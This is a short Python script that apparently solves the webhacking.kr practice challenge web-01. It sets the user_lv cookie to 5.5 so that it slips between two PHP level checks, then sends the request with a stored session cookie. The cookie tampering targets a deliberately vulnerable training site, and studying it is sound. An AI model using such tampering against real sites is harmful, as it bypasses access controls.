# if($_COOKIE['user_lv']>=6) $_COOKIE['user_lv']=1;
# if($_COOKIE['user_lv']>5) solve(1);
# > set value as 5.5

import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/web-01/index.php'
cookies['user_lv'] = '5.5'

response = requests.get(url, cookies=cookies)
print(response.text)

